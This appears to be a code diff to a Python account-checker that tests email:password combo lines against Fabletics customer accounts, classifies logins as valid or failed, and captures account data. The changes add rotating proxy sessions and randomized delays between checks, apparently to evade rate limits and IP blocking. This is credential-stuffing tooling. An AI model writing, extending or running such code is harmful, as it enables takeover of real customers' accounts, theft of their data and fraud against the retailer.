@@ -1,13 +1,14 @@
 from __future__ import annotations
 
+import os
+import random
+import time
 from dataclasses import dataclass, field
 from typing import Any
 
-import os
-
 from .client import FableticsAPIError, FableticsClient
-from .config import DEFAULT_PROXY
-from .proxy import parse_proxy
+from .config import CHECK_DELAY_MAX, CHECK_DELAY_MIN, DEFAULT_PROXY
+from .proxy import parse_proxy, with_rotating_session
 
 
 @dataclass
@@ -136,11 +137,19 @@ def capture_account_data(client: FableticsClient, token: str, login_customer: di
 _UNSET = object()
 
 
-def resolve_proxy(proxy: str | None = None) -> str | None:
+def resolve_proxy(proxy: str | None = None, *, rotate: bool = True) -> str | None:
     raw = proxy if proxy is not None else os.environ.get("FABLETICS_PROXY") or DEFAULT_PROXY
     if not raw:
         return None
-    return parse_proxy(raw)
+    parsed = parse_proxy(raw)
+    if rotate and os.environ.get("FABLETICS_ROTATE_PROXY", "1") != "0":
+        parsed = with_rotating_session(parsed)
+    return parsed
+
+
+def _pace_request() -> None:
+    delay = random.uniform(CHECK_DELAY_MIN, CHECK_DELAY_MAX)
+    time.sleep(delay)
 
 
 def _is_auth_failure(message: str) -> bool:
@@ -197,6 +206,7 @@ def check_account(
         resolved_proxy = resolve_proxy()
     else:
         resolved_proxy = proxy
+    _pace_request()
     client = FableticsClient(proxy=resolved_proxy, timeout=timeout)
 
     try:
@@ -207,6 +217,8 @@ def check_account(
         return _classify_api_error(exc, email, password)
     except Exception as exc:
         return CheckResult(status="ERROR", email=email, password=password, message=str(exc))
+    finally:
+        client.close()
 
 
 def parse_combo(line: str) -> tuple[str, str] | None:
